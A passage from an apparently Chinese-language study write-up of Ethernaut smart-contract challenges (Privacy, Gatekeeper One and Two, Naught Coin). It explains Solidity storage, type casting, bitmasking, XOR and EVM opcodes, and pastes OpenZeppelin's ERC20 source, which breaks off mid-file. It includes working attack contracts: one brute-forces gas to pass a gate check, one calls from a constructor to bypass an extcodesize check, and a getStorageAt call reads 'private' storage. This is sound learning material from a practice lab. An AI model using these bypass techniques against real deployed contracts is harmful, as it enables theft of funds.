slot中\n\n存储插槽的第一项会以低位对齐的方式储存\n值类型仅使用存储它们所需的字节\n如果存储插槽中的剩余空间不足以储存一个值类型，那么它会被存入下一个存储插槽\n结构体struct和数组数据总是会开启一个新插槽（但结构体或数组中的各元素，则按规则紧密打包）\n结构体和数组之后的数据也或开启一个新插槽\n\n\n回看题目，stor0是locked，stor1是ID\n那么这里的stor5就相当于_key（这边有点不太理解）\n利用await web3.eth.getStorageAt(\"0x1D5ddFb5Ce911FEED9B0C5514aD7E58f30b85132\",5)来得到data[2]的值\n再用\"0x7b9b6db4bb8f1de0aa618ff30ca9aceb8cf77cd5700414981d7a13c0676304f1\".slice(0,34)获得_key的值（为什么是34？为什么这样子操作没搞懂）\n\n还有一种编写合约的方法\n\n14.Gatekeeper One// SPDX-License-Identifier: MIT\npragma solidity ^0.8.0;\n\ncontract GatekeeperOne {\n\n  address public entrant;\n\n  modifier gateOne() {\n    require(msg.sender != tx.origin);\n    _;\n  }\n\n  modifier gateTwo() {\n    require(gasleft() % 8191 == 0);\n    _;\n  }\n\n  modifier gateThree(bytes8 _gateKey) {\n      require(uint32(uint64(_gateKey)) == uint16(uint64(_gateKey)), \"GatekeeperOne: invalid gateThree part one\");\n      require(uint32(uint64(_gateKey)) != uint64(_gateKey), \"GatekeeperOne: invalid gateThree part two\");\n      require(uint32(uint64(_gateKey)) == uint16(uint160(tx.origin)), \"GatekeeperOne: invalid gateThree part three\");\n    _;\n  }\n\n  function enter(bytes8 _gateKey) public gateOne gateTwo gateThree(_gateKey) returns (bool) {\n    entrant = tx.origin;\n    return true;\n  }\n}\n这个题目一点思路都没有（跟着教程过一遍）\n先看第一个修饰器\nmodifier gateOne() {\n  require(msg.sender != tx.origin);\n  _;\n}\n\nmsg.sender(address)：消息的发送者（当前调用）\ntx.origin(address)：交易的发送者（完整的调用链）\n\n网上找到一张很清晰的图\n\n根据第一个修饰器的要求：require(msg.sender != tx.origin);\n我们需要用智能合约中调用enter，而不是账号直接调用\n先看第三个\nmodifier gateThree(bytes8 _gateKey) {\n    require(uint32(uint64(_gateKey)) == uint16(uint64(_gateKey)), \"GatekeeperOne: invalid gateThree part one\");\n    require(uint32(uint64(_gateKey)) != uint64(_gateKey), \"GatekeeperOne: invalid gateThree part two\");\n    require(uint32(uint64(_gateKey)) == uint16(uint160(tx.origin)), \"GatekeeperOne: invalid gateThree part three\");\n  _;\n}\n基本类型之间的转换1byte=8位（XXXX XXXX）X为0或1\nbytes1=uint8……bytes32=uint256\nbytes1 num1 = 0x12;\t\t//0x是16进制的表示方法 12是一字节\nbytes4 num2 = 0x12121212;\t//以此类推12 12 12 12 共四字节\n隐式转换一般是从存储范围小的类型转换到存储范围大的类型\n在赋值期间、将参数传递给函数时以及应用运算符时，编译器会自动应用隐式类型转换\neg：uint8可转换为uint16和int128、int256\n但int8不可转换为uint256，因为uint256不能保存负值\n\n\n\n\n\n\n\n\n\nuint8 y;\nuint16 z;\nuint32 x = y + z;\n在这个示例中，加法的操作数y和z没有相同的类型，但uint8可以隐式转换为uint16，在添加之后执行另一个隐式转换\nTip：在整数之间进行类型转换时，数值不发生改变，而将整数类型，特别是比较大的整数类型转换成小数类型时，由于存储方式不同，有可能存在数据精度的损失。\n显示转换\n如果将整数显式转换为更小的类型，则高位位将被截断：\n\nuint32 a = 0x12345678;\nuint16 b = uint16(a); // b will be 0x5678 now\n\n如果一个整数被显式地转换为一个更大的类型，它会被填充到左边（即，在更高阶的一端）。转换的结果将与原始整数比较：\n\nuint16 a = 0x1234;\nuint32 b = uint32(a); // b will be 0x00001234 now\nassert(a == b);\n\n固定大小字节类型在转换期间表现不同。它们可以被认为是单个字节的序列，转换为更小的类型将切断序列：\n\nbytes2 a = 0x1234;\nbytes1 b = bytes1(a); // b will be 0x12\n\n如果将固定大小的字节类型显式转换为更大的类型，则会在右侧进行填充。访问固定索引处的字节将在转换前后产生相同的值（如果索引仍在范围内）：\n\nbytes2 a = 0x1234;\nbytes4 b = bytes4(a); // b will be 0x12340000\nassert(a[0] == b[0]);\nassert(a[1] == b[1]);\n\nbytes数组和bytescalldata 切片可以显式转换为固定字节类型 ( bytes1/…/ bytes32)。如果数组比目标固定字节类型长，则会在末尾截断。如果数组比目标类型短，它将在末尾用零填充。\n\n// SPDX-License-Identifier: GPL-3.0\npragma solidity ^0.8.5;\n\ncontract C {\n    bytes s = \"abcdefgh\";\n    function f(bytes calldata c, bytes memory m) public view returns (bytes16, bytes3) {\n        require(c.length == 16, \"\");\n        bytes16 b = bytes16(m);  // if length of m is greater than 16, truncation will happen\n        b = bytes16(s);  // padded on the right, so result is \"abcdefgh\\0\\0\\0\\0\\0\\0\\0\\0\"\n        bytes3 b1 = bytes3(s); // truncated, b1 equals to \"abc\"\n        b = bytes16(c[:8]);  // also padded with zeros\n        return (b, b1);\n    }\n}\n位掩码位运算：任何位（0 或 1）与 0 进行 AND 运算后都为 0，对吗？当用 1 完成相同的操作时，无论实际位是什么。所以，0 AND 1等于 0 本身。\n现在，如果你这样做0x12345678 AND 0x0000FFFF呢？你会得到0x00005678！\n我们刚刚所做的，隐藏了一些位，称为“位掩码”。\n直接看题目\n假设要发送的_gateKey是0x B1 B2 B3 B4 B5 B6 B7 B8\n第一行\nrequire(uint32(uint64(_gateKey)) == uint16(uint64(_gateKey)), \"GatekeeperOne: invalid gateThree part one\");\n如果要写出第一行，则必须满足一下条件：\n0x B5 B6 B7 B8 == 0x 00 00 B7 B8\n所以B5和B6必须为0！\n第二行\nrequire(uint32(uint64(_gateKey)) != uint64(_gateKey), \"GatekeeperOne: invalid gateThree part two\");\n需要满足条件：\n0x 00 00 00 00 B5 B6 B7 B8 != 0x B1 B2 B3 B4 B5 B6 B7 B8\n所以前四个字节不能为0（也就是前四个字节可以是除0之外的任何内容）\n第三行\nrequire(uint32(uint64(_gateKey)) == uint16(uint160(tx.origin)), \"GatekeeperOne: invalid gateThree part three\");\n需要满足要求：\n0x B5 B6 B7 B8 = 0x 00 00 SECOND_LAST_BYTE_OF_YOUR_ADDR LAST_BYTE_OF_YOUR_ADDR\n比较1和3行，得到B7和B8是攻击合约地址的最后一个字节！\n关键是0x ANY_BYTE ANY_BYTE ANY_BYTE ANY_BYTE 00 00 SECOND_LAST_BYTE_OF_YOUR_ADDR LAST_BYTE_OF_YOUR_ADDR。\n可以使用攻击合约的地址来制作_gateKey：\n\n获取地址的最后8个字节：通过将地址存储在uint64数据类型中来执行此操作。\n通过位掩码使 B5 和 B6 为零：使用从上一步获得的值执行与操作0xFFFFFFFF0000FFFF。\n现在，只需将其存储uint64到bytes8中，因为enter()函数需要bytes8.\n\n长这样：\nbytes8 key = bytes8(uint64(msg.sender) &amp; 0xFFFFFFFF0000FFFF);\n\n\n\n\n\n\n\n\n\n注意：这里的msg.sender变成tx.origin了！！！\n再来看看第2个修饰器\nmodifier gateTwo() {\n  require(gasleft() % 8191 == 0);\n  _;\n}\ngasleft()函数，用于返回剩余的gas\n需要满足要求：发送既能确保我们的交易被执行，又能保证gate 2开始时剩余的gas量是8191的倍数的确切的gas\n解决方法：\n首先，我们需要发送的气体总量可以表示为x + (8191 * k)，在这里x是调用之前用完的gas量，那么gasLeft()剩下的是8191的倍数\n我们可以把k固定为一个数，比如说3，现在需要弄清楚的是x\n所以使用暴力破解：即尝试发送具有的所有可能值的交易x\n类似于这样：\nbool success;\nuint256 gasBrute;\nfor(gasBrute = _lowerGasBrute; gasBrute &lt;= _upperGasBrute; gasBrute++){\n    (success, ) = _gatekeeperAddr.call.gas(gasBrute + (8191 * 3))( // `x` is replaced by `gasBrute`\n        abi.encodeWithSignature(\"enter(bytes8)\", key) // You have the key from the previous section now\n      );\n    if(success){\n        break;\n    }\n}        \nrequire(success, \"HACK FAILED\");\nemit Hacked(gasBrute); // -&gt; This is the least value of `x`.\n整合一下，攻击合约如下\ncontract skipgate{\n  GatekeeperOne keykey;\n\n  constructor(address _addr){\n      keykey=GatekeeperOne(_addr);\n  }\n\n  function attack() external{\n    bytes8 _gateKey = bytes8(uint64(uint160(msg.sender))&amp;0xFFFFFFFF0000FFFF);\t//在这里要用uint160(msg.sender)，如果没有用uint160处理会报错说不能把address类型转为uint64\n\n    for(uint256 i=1;i&lt;8191;i++){\n       (bool success,)=address(keykey).call{gas: i + (8191 * 3)}(abi.encodeWithSignature(\"enter(bytes8)\", _gateKey));\n\n           if(success){\n        break;\n        }\n    }\n}\n在本地测试时编译器一直崩溃，但是上链就行\n\n15.Gatekeeper Two源码\n// SPDX-License-Identifier: MIT\npragma solidity ^0.8.0;\n\ncontract GatekeeperTwo {\n\n  address public entrant;\n\n  modifier gateOne() {\n    require(msg.sender != tx.origin);\n    _;\n  }\n\n  modifier gateTwo() {\n    uint x;\n    assembly { x := extcodesize(caller()) }\n    require(x == 0);\n    _;\n  }\n\n  modifier gateThree(bytes8 _gateKey) {\n    require(uint64(bytes8(keccak256(abi.encodePacked(msg.sender)))) ^ uint64(_gateKey) == type(uint64).max);\n    _;\n  }\n\n  function enter(bytes8 _gateKey) public gateOne gateTwo gateThree(_gateKey) returns (bool) {\n    entrant = tx.origin;\n    return true;\n  }\n}\n第一个修饰器和前一题是一样的，需要中间合约来调用函数\n第二个修饰器，先需要先学习以下内容\nAssembly这是一个没见过的东西，摘自（https://docs.soliditylang.org/en/v0.4.23/assembly.html#）\n\nSolidity Assembly：Solidity 定义了一种汇编语言，也可以在没有 Solidity 的情况下使用。这种汇编语言也可以用作 Solidity 源代码中的“内联汇编”。\n句法：Assembly 完全像 Solidity 一样解析注释、文字和标识符，所以你可以使用通常的//和注释。内联汇编由这些花括号和里面的花括号标记，可以使用以下内容/* */``assembly { ... }\n\n\n\n补充操作码：\n\n\n\n\n操作说明\n\n\n解释\n\n\n\n\nstop\n-\nF\n停止执行，等同于(0,0)\n\n\nadd(x, y)\n\nF\nx + y\n\n\nsub(x, y)\n\nF\nx - y\n\n\nmul(x, y)\n\nF\nx * y\n\n\ndiv(x, y)\n\nF\nx / y\n\n\nsdiv(x, y)\n\nF\nx / y, 对于二进制补码中的有符号数\n\n\nmod(x, y)\n\nF\nx % y\n\n\nsmod(x, y)\n\nF\nx % y, 对于二进制补码中的有符号数\n\n\nexp(x, y)\n\nF\nx 的 y 次方\n\n\nnot(x)\n\nF\n~x,  x 的每一位都取反\n\n\nlt(x, y)\n\nF\n如果 x &lt; y 为 1，否则为 0\n\n\ngt(x, y)\n\nF\n如果 x &gt; y 则为 1，否则为 0\n\n\nslt(x, y)\n\nF\n如果 x &lt; y 则为 1，否则为 0，对于二进制补码中的有符号数\n\n\nsgt(x, y)\n\nF\n如果 x &gt; y 则为 1，否则为 0，对于二进制补码中的有符号数\n\n\neq(x, y)\n\nF\n如果 x == y 则为 1，否则为 0\n\n\niszero(x)\n\nF\n如果 x == 0 则为 1，否则为 0\n\n\nand(x, y)\n\nF\nx 和 y 的按位与\n\n\nor(x, y)\n\nF\nx 和 y 的按位或\n\n\nxor(x, y)\n\nF\nx 和 y 的按位异或\n\n\nbyte(n, x)\n\nF\nx 的第 n 个字节，其中最高有效字节是第 0 个字节\n\n\nshl(x, y)\n\nC\ny 逻辑左移 x 位\n\n\nshr(x, y)\n\nC\ny 逻辑右移 x 位\n\n\nsar(x, y)\n\nC\n将 y 算术右移 x 位\n\n\naddmod(x, y, m)\n\nF\n(x + y) % m 任意精度算术\n\n\nmulmod(x, y, m)\n\nF\n(x * y) % m 任意精度算术\n\n\nsignextend(i, x)\n\nF\n符号从最低有效位起第 (i*8+7) 位扩展\n\n\nkeccak256(p, n)\n\nF\nkeccak(mem[p…(p+n)))\n\n\nsha3(p, n)\n\nF\nkeccak(mem[p…(p+n)))\n\n\njump(label)\n-\nF\n跳转到标签/代码位置\n\n\njumpi(label, cond)\n-\nF\n如果 cond 非零则跳转到标签\n\n\npc\n\nF\n当前在代码中的位置\n\n\npop(x)\n-\nF\n删除 x 推送的元素\n\n\ndup1 … dup16\n\nF\n将第 i 个堆栈槽复制到顶部（从顶部开始计数）\n\n\nswap1 … swap16\n*\nF\n交换最顶层和它下面的第 i 个栈槽\n\n\nmload(p)\n\nF\n内存[p..(p+32))\n\n\nmstore(p, v)\n-\nF\n内存[p..(p+32)) := v\n\n\nmstore8(p, v)\n-\nF\nmem[p] := v &amp; 0xff （只修改一个字节）\n\n\nsload(p)\n\nF\n存储[p]\n\n\nsstore(p, v)\n-\nF\n存储[p] := v\n\n\nmsize\n\nF\n内存大小，即最大访问内存索引\n\n\ngas\n\nF\n气体仍然可用于执行\n\n\naddress\n\nF\n当前合约/执行上下文的地址\n\n\nbalance(a)\n\nF\n地址a的wei余额\n\n\ncaller\n\nF\n呼叫发件人（不包括delegatecall）\n\n\ncallvalue\n\nF\nwei 与当前通话一起发送\n\n\ncalldataload(p)\n\nF\n从位置 p 开始调用数据（32 字节）\n\n\ncalldatasize\n\nF\n调用数据的大小（以字节为单位）\n\n\ncalldatacopy(t, f, s)\n-\nF\n从位置 f 的 calldata 复制 s 个字节到位置 t 的内存\n\n\ncodesize\n\nF\n当前合约/执行上下文的代码大小\n\n\ncodecopy(t, f, s)\n-\nF\n从位置 f 的代码复制 s 个字节到位置 t 的内存\n\n\nextcodesize(a)\n\nF\n地址a处代码的大小\n\n\nextcodecopy(a, t, f, s)\n-\nF\n像 codecopy(t, f, s) 但在地址 a 处获取代码\n\n\nreturndatasize\n\nB\n最后返回数据的大小\n\n\nreturndatacopy(t, f, s)\n-\nB\n将 s 个字节从位置 f 的 returndata 复制到位置 t 的 mem\n\n\ncreate(v, p, s)\n\nF\n使用代码 mem[p..(p+s)) 创建新合约并发送 v wei 并返回新地址\n\n\ncreate2(v, n, p, s)\n\nC\n使用代码 mem[p..(p+s)) 在地址 keccak256( . n . keccak256(mem[p..(p+s))) 创建新合约并发送 v wei 并返回新地址\n\n\ncall(g, a, v, in, insize, out, outsize)\n\nF\n在地址 a 调用合约，输入 mem[in..(in+insize)) 提供 g gas 和 v wei 以及输出区域 mem[out..(out+outsize)) 错误返回 0（例如 out of gas）和1 成功\n\n\ncallcode(g, a, v, in, insize, out, outsize)\n\nF\n与 a相同call但仅使用 a 中的代码，否则留在当前合约的上下文中\n\n\ndelegatecall(g, a, in, insize, out, outsize)\n\nH\n相同callcode但也保持caller 和callvalue\n\n\nstaticcall(g, a, in, insize, out, outsize)\n\nB\n相同但不允许状态修改call(g, a, 0, in, insize, out, outsize)\n\n\nreturn(p, s)\n-\nF\n结束执行，返回数据 mem[p..(p+s))\n\n\nrevert(p, s)\n-\nB\n结束执行，恢复状态变化，返回数据 mem[p..(p+s))\n\n\nselfdestruct(a)\n-\nF\n结束执行，销毁当前合约并将资金发送到\n\n\ninvalid\n-\nF\n以无效指令结束执行\n\n\nlog0(p, s)\n-\nF\n没有主题和数据的日志 mem[p..(p+s))\n\n\nlog1(p, s, t1)\n-\nF\n记录主题 t1 和数据 mem[p..(p+s))\n\n\nlog2(p, s, t1, t2)\n-\nF\n记录主题 t1、t2 和数据 mem[p..(p+s))\n\n\nlog3(p, s, t1, t2, t3)\n-\nF\n记录主题 t1、t2、t3 和数据 mem[p..(p+s))\n\n\nlog4(p, s, t1, t2, t3, t4)\n-\nF\n记录主题 t1、t2、t3、t4 和数据 mem[p..(p+s))\n\n\norigin\n\nF\n交易发送方\n\n\ngasprice\n\nF\n交易的gas价格\n\n\nblockhash(b)\n\nF\n块 nr b 的哈希值 - 仅适用于除当前块之外的最后 256 个块\n\n\ncoinbase\n\nF\n当前采矿受益人\n\n\ntimestamp\n\nF\n当前块的时间戳，自纪元以来的秒数\n\n\nnumber\n\nF\n当前区块号\n\n\ndifficulty\n\nF\n当前区块的难度\n\n\ngaslimit\n\nF\n当前区块的区块gas limit\n\n\n\n\n第二个修饰器\nmodifier gateTwo() {\n  uint x;\n  assembly { x := extcodesize(caller()) }\n  require(x == 0);\n  _;\n}\nextcodesize：\n在 Solidity 中，我们可以通过在 YUL 中使用汇编来使用低级代码。它们可以在内部使用assembly {...}。extcodesize就是这样一种操作码，它返回任何地址的代码大小。\ncaller()：\n这是呼叫发送者的地址（delegatecall 除外）。\n在上面显示的修饰符中，变量x用于存储caller()地址上代码的大小，即调用 Gatekeeper Two 实例的合约。我们需要使用另一个合约来确保我们在第一个关口通过验证。\n正在检查该x变量以确保合约代码的大小为 0，换句话说，EOA应该进行调用而不是另一个合约。\n\n\n\n\n\n\n\n\n\n注意：\n以太坊中，分为两种账户：\n\n外部账户：简称EOA，它拥有私钥，其codeHash为空\n合约账户：简称CA，它没有私钥，其codeHash非空\n\n这是构造函数发挥作用的地方。在合约初始化期间，或调用其构造函数时，其运行时代码大小始终为 0。\n因此，当我们放置漏洞利用逻辑并从构造函数内部调用它时， extcodesize 的返回值将始终返回零。这实质上意味着我们所有的漏洞利用代码都将从我们合约的构造函数内部调用以通过第二道门。\n第三个修饰器\nmodifier gateThree(bytes8 _gateKey) {\n  require(uint64(bytes8(keccak256(abi.encodePacked(msg.sender)))) ^ uint64(_gateKey) == type(uint64).max);\n  _;\n}\nXOR（按位异或）XOR的符号是^\n\n归零率：a ^ a = 0\n恒等率：a ^ 0 = a\n交换律：a ^ b = b ^ a\n结合律：a ^ b ^ c = a ^ ( b ^ c ) = ( a ^ b ) ^ c\n自反：a ^ b ^ a = b\nd = a ^ b ^ c 可以推出 a = d ^ b ^ c\n若x是二进制数0101，y是二进制数1011，则 x ^ y = 1110 ，只有在两个比较的位不同时结果是1，否则结果为0\n\n这是一个简单的 XOR 运算，我们知道它A XOR B = C等于A XOR C = B。_gateKey使用此逻辑，我们只需使用以下代码即可轻松找到未知数的值：\nbytes8 myKey = bytes8(uint64(bytes8(keccak256(abi.encodePacked(address(this))))) ^ type(uint64).max);\n攻击代码\ncontract skipgate{\n  GatekeeperTwo keykey;\n\n  constructor(address _addr) public {\n      keykey=GatekeeperTwo(_addr);\n\n      bytes8 _gateKey = bytes8(uint64(bytes8(keccak256(abi.encodePacked(this)))) ^ (type(uint64).max));\n\n      keykey.enter(_gateKey);\n  }\n}\n\n\n\n\n\n\n\n\n\n注意：bytes8 _gateKey = bytes8(uint64(bytes8(keccak256(abi.encodePacked(this)))) ^ (type(uint64).max));这行代码一开始copy进来this为msg.sender不能通过，题目中的msg.sender为攻击合约的地址\n16.Naught Coin// SPDX-License-Identifier: MIT\npragma solidity ^0.8.0;\n\nimport 'openzeppelin-contracts-08/token/ERC20/ERC20.sol';\n\n contract NaughtCoin is ERC20 {\n\n  // string public constant name = 'NaughtCoin';\n  // string public constant symbol = '0x0';\n  // uint public constant decimals = 18;\n  uint public timeLock = block.timestamp + 10 * 365 days;\n  uint256 public INITIAL_SUPPLY;\n  address public player;\n\n  constructor(address _player) \n  ERC20('NaughtCoin', '0x0') {\n    player = _player;\n    INITIAL_SUPPLY = 1000000 * (10**uint256(decimals()));\n    // _totalSupply = INITIAL_SUPPLY;\n    // _balances[player] = INITIAL_SUPPLY;\n    _mint(player, INITIAL_SUPPLY);\n    emit Transfer(address(0), player, INITIAL_SUPPLY);\n  }\n  \n  function transfer(address _to, uint256 _value) override public lockTokens returns(bool) {\n    super.transfer(_to, _value);\n  }\n\n  // Prevent the initial owner from transferring tokens until the timelock has passed\n  modifier lockTokens() {\n    if (msg.sender == player) {\n      require(block.timestamp &gt; timeLock);\n      _;\n    } else {\n     _;\n    }\n  } \n} \n但是部署的时候出现报错说找不到那个库，加上@也不行\n\n\n修改代码为：\nimport '@openzeppelin/contracts/token/ERC20/ERC20.sol';\nERC20https://github.com/ethereum/EIPs/blob/master/EIPS/eip-20.md\n// SPDX-License-Identifier: MIT\n// OpenZeppelin Contracts (last updated v4.8.0) (token/ERC20/ERC20.sol)\n\npragma solidity ^0.8.0;\n\nimport \"./IERC20.sol\";\nimport \"./extensions/IERC20Metadata.sol\";\nimport \"../../utils/Context.sol\";\n\n/**\n * @dev Implementation of the {IERC20} interface.\n *\n * This implementation is agnostic to the way tokens are created. This means\n * that a supply mechanism has to be added in a derived contract using {_mint}.\n * For a generic mechanism see {ERC20PresetMinterPauser}.\n *\n * TIP: For a detailed writeup see our guide\n * https://forum.openzeppelin.com/t/how-to-implement-erc20-supply-mechanisms/226[How\n * to implement supply mechanisms].\n *\n * The default value of {decimals} is 18. To change this, you should override\n * this function so it returns a different value.\n *\n * We have followed general OpenZeppelin Contracts guidelines: functions revert\n * instead returning `false` on failure. This behavior is nonetheless\n * conventional and does not conflict with the expectations of ERC20\n * applications.\n *\n * Additionally, an {Approval} event is emitted on calls to {transferFrom}.\n * This allows applications to reconstruct the allowance for all accounts just\n * by listening to said events. Other implementations of the EIP may not emit\n * these events, as it isn't required by the specification.\n *\n * Finally, the non-standard {decreaseAllowance} and {increaseAllowance}\n * functions have been added to mitigate the well-known issues around setting\n * allowances. See {IERC20-approve}.\n */\ncontract ERC20 is Context, IERC20, IERC20Metadata {\n    mapping(address =&gt; uint256) private _balances;\n\n    mapping(address =&gt; mapping(address =&gt; uint256)) private _allowances;\n\n    uint256 private _totalSupply;\n\n    string private _name;\n    string private _symbol;\n\n    /**\n     * @dev Sets the values for {name} and {symbol}.\n     *\n     * All two of these values are immutable: they can only be set once during\n     * construction.\n     */\n    constructor(string memory name_, string memory symbol_) {\n        _name = name_;\n        _symbol = symbol_;\n    }\n\n    /**\n     * @dev Returns the name of the token.\n     */\n    function name() public view virtual override returns (string memory) {\n        return _name;\n    }\n\n    /**\n     * @dev Returns the symbol of the token, usually a shorter version of the\n     * name.\n     */\n    function symbol() public view virtual override returns (string memory) {\n        return _symbol;\n    }\n\n    /**\n     * @dev Returns the number of decimals used to get its user representation.\n     * For example, if `decimals` equals `2`, a balance of `505` tokens should\n     * be displayed to a user as `5.05` (`505 / 10 ** 2`).\n     *\n     * Tokens usually opt for a value of 18, imitating the relationship between\n     * Ether and Wei. This is the default value returned by this function, unless\n     * it's overridden.\n     *\n     * NOTE: This information is only used for _display_ purposes: it in\n     * no way affects any of the arithmetic of the contract, including\n     * {IERC20-balanceOf} and {IERC20-transfer}.\n     */\n    function decimals() public view virtual override returns (uint8) {\n        return 18;\n    }\n\n    /**\n     * @dev See {IERC20-totalSupply}.\n     */\n    function totalSupply() public view virtual override returns (uint256) {\n        return _totalSupply;\n    }\n\n    /**\n     * @dev See {IERC20-balanceOf}.\n     */\n    function balanceOf(address account) public view virtual override returns (uint256) {\n        return _balances[account];\n    }\n\n    /**\n     * @dev See {IERC20-transfer}.\n     *\n     * Requirements:\n     *\n     * - `to` cannot be the zero address.\n     * - the caller must have a balance of at least `amount`.\n     */\n    function transfer(address to, uint256 amount) public virtual override returns (bool) {\n        address owner = _msgSender();\n        _transfer(owner, to, amount);\n        return true;\n    }\n\n    /**\n     * @dev See {IERC20-allowance}.\n     */\n    function allowance(address owner, address spender) public view virtual override returns (uint256) {\n        return _allowances[owner][spender];\n    }\n\n    /**\n     * @dev See {IERC20-approve}.\n     *\n     * NOTE: If `amount` is the maximum `uint256`, the allowance is not updated on\n     * `transferFrom`. This is semantically equivalent to an infinite approval.\n     *\n     * Requirements:\n     *\n     * - `spender` cannot be the zero address.\n     */\n    function approve(address spender, uint256 amount) public virtual override returns (bool) {\n        address owner = _msgSender();\n        _approve(owner, spender, amount);\n        return true;\n    }\n\n    /**\n     * @dev See {IERC20-transferFrom}.\n     *\n     * Emits an {Approval} event indicating the updated allowance. This is not\n     * required by the EIP. See the note at the beginning of {ERC20}.\n     *\n     * NOTE: Does not update the allowance if the current allowance\n     * is the maximum `uint256`.\n     *\n     * Requirements:\n     *\n     * - `from` and `to` cannot be the zero address.\n     * - `from` must have a balance of at least `amount`.\n     * - the caller must have allowance for ``from``'s tokens of at least\n     * `amount`.\n     */\n    function transferFrom(address from, address to, uint256 amount) public virtual override returns (bool) {\n        address spender = _msgSender();\n        _spendAllowance(from, spender, amount);\n        _transfer(from, to, amount);\n        return true;\n    }\n\n    /**\n     * @dev Atomically increases the allowance granted to `spender` by the caller.\n     *\n     * This is an alternative to {approve} that can be used as a mitigation for\n     * problems described in {IERC20-approve}.\n     *\n     * Emits an {Approval} event indicating the updated allowance.\n     *\n     * Requirements:\n     *\n     * - `spender` cannot be the zero address.\n     */\n    function increaseAllowance(address spender, uint256 addedValue) public virtual returns (bool) {\n        address owner = _msgSender();\n        _approve(owner, spender, allowance(owner, spender) + addedValue);\n        return true;\n    }\n\n    /**\n     * @dev Atomically decreases the allowance granted to `spender` by the caller.\n     *\n     * This is an alternative to {approve} that can be used as a mitigation for\n     * problems described in {IERC20-approve}.\n     *\n     * Emits an {Approval} event indicating the updated allowance.\n     *\n     * Requirements:\n     *\n     * - `spender` cannot be the zero address.\n     * - `spender` must have allowance for the caller of at least\n     * `subtractedValue`.\n     */\n    function decreaseAllowance(address spender, uint256 subtractedValue) public virtual returns (bool) {\n        address owner = _msgSender();\n        uint256 currentAllowance = allowance(owner, spender);\n        require(currentAllowance &gt;= subtractedValue, \"ERC20: decreased allowance below zero\");\n        unchecked {\n            _approve(owner, spender, currentAllowance - subtractedValue);\n        }\n\n        return true;\n    }\n\n    /**\n     * @dev Moves `amount` of tokens from `from` to `to`.\n     *\n     * This internal function is equivalent to {transfer}, and can be used to\n     * e.g. implement automatic token fees, slashing mechanisms, etc.\n     *\n     * Emits a {Transfer} event.\n     *\n     * Requirements:\n     *\n     * - `from` cannot be the zero address.\n     * - `to` cannot be the zero address.\n     * - `from` must have a balance of at least `amount`.\n     */\n    function _transfer(address from, address to, uint256 amount) internal virtual {\n        require(from != address(0), \"ERC20: transfer from the zero address\");\n        require(to != address(0), \"ERC20: transfer to the zero address\");\n\n        _beforeTokenTransfer(from, to, amount);\n\n        uint256 fromBalance = _balances[from];\n        require(fromBalance &gt;= amount, \"ERC20: transfer amount exceeds balance\");\n        unchecked {\n            _balances[from] = fromBalance - amount;\n            // Overflow not possible: the sum of all balances is capped by totalSupply, and the sum is preserved by\n            // decrementing then incrementing.\n            _balances[to] += amount;\n        }\n\n        emit Transfer(from, to, amount);\n\n        _afterTokenTransfer(from, to, amount);\n    }\n\n    /** @dev Creates `amount` tokens and assigns them to `account`, increasing\n     * the total supply.\n     *\n     * Emits a {Transfer} event with `from` set to the zero address.\n     *\n     * Requirements:\n     *\n     * - `account` cannot be the zero address.\n     */\n    function _mint(address account, uint256 amount) internal virtual {\n        require(account != address(0), \"ERC20: mint to the zero address\");\n\n        _beforeTokenTransfer(address(0), account, amount);\n\n        _totalSupply += amount;\n        unchecked {\n            // Overflow not possible: balance + amount is at most totalSupply + amount, which is checked above.\n            _balances[account] += amount;\n        }\n        emit Transfer(address(0), account, amount);\n\n        _afterTokenTransfer(address(0), account, amount);\n    }\n\n    /**\n     * @dev Destroys `amount` tokens from `account`, reducing the\n     * total supply.\n     *\n     * Emits a {Transfer} event with `to` set to the zero address.\n     *\n     * Requirements:\n     *\n     * - `account` cannot be the zero address.\n     * - `account` must have at least `amount` tokens.\n     */\n    function _burn(address account, uint256 amount) internal virtual {\n        require(account != address(0), \"ERC20: burn from the zero address\");\n\n        _beforeTokenTransfer(account, address(0), amount);\n\n        uint256 accountBalance = _balances[account];\n        require(accountBalance &gt;= amount, \"ERC20: burn amount exceeds balance\");\n        unchecked {\n            _balances[account] = accountBalance - amount;\n            // Overflow not possible: amount &lt;= accountBalance &lt;= totalSupply.\n            _totalSupply -= amount;\n        }\n\n        emit Transfer(account, address(0), amount);\n\n        _afterTokenTransfer(account, address(0), amount);\n    }\n\n    /**\n     * @dev Sets `amount` as the allowance of `spender` over the `owner` s tokens.\n     *\n     * This internal function is equivalent to `approve`, and can be used to\n     * e.g. set automatic allowances for certain subsystems, etc.\n     *\n     * Emits an {Approval} event.\n     *\n     * Requirements:\n     *\n     * - `owner` cannot be the zero address.\n     * - `spender` cannot be the zero address.\n     */\n    function _approve(address owner, address spender, uint256 amount) internal virtual {\n        require(owner != address(0), \"ERC20: approve from the zero address\");\n        require(spender != address(0), \"ERC20: approve to the zero address\");\n\n        _allowances[owner][spender] = amount;\n        emit Approval(owner, spender, amount);\n    }\n\n    /**\n     * @dev Updates `owner` s allowance for `spender` based on spent `amount`.\n     *\n     * Does not update the allowance amount in case of infinite allowance.\n     * Revert if not enough allowance is available.\n     *\n     * Might emit an {Approval} event.\n     */\n    function _spendAllowance(address owner, address spender, uint256 amount) internal virtual {\n        uint256 currentAllowance = allowance(owner, spender);\n        if (currentAllowance != type(uint256).max) {\n            require(currentAllowance &gt;= amount, \"ERC20: insufficient allowance\");\n            unchecked {\n                _approve(owner, spender, currentAllowance - amount);\n            }\n        }\n    }\n\n    /**\n     * @dev Hook that is called before any transfer of tokens. This includes\n     * minting and burning.\n     *\n     * Calling conditions:\n     *\n     * - when `from` and `to` are both non-zero, `amount` of ``from``'s tokens\n     * will be transferred to `to`.\n     * - when `from` is zero, `amount` tokens will be minted for `to`.\n     * - when `to` is zero, `amount` of ``from``'s tokens will be burned.\n     * - `from` and `to` are never both zero.\n     *\n     * To learn more about hooks, head to xref:ROOT:extending-contracts.adoc#using-hooks[Using Hooks].\n     */\n    function _beforeTokenTransfer(address from, address to, uint256 amount) internal virtual {}\n\n    /**\n     * @dev Hook that is called after any transfer of tokens. This includes\n     * minting and burning.\n     *\n     * Calling conditions:\n     *\n     * - when `from` and `to` are both non-zero, `amount` of ``from``'s tokens\n     * has been transferred to `to`.\n     * - when `from` is zero, `amount` tokens have been minted for `to`.\n     * - when `to` is zero, `amount` of ``from``'s tokens have been burned.\n     * - `from` and `to` are never both zero.\n     *\n     * To learn more about hooks, head to xref:ROOT:extending-contracts.adoc#using-hooks[Using Hooks].\n     */\n    function _afterTokenTransfer(address from, address to, uint256 amount) internal virtual 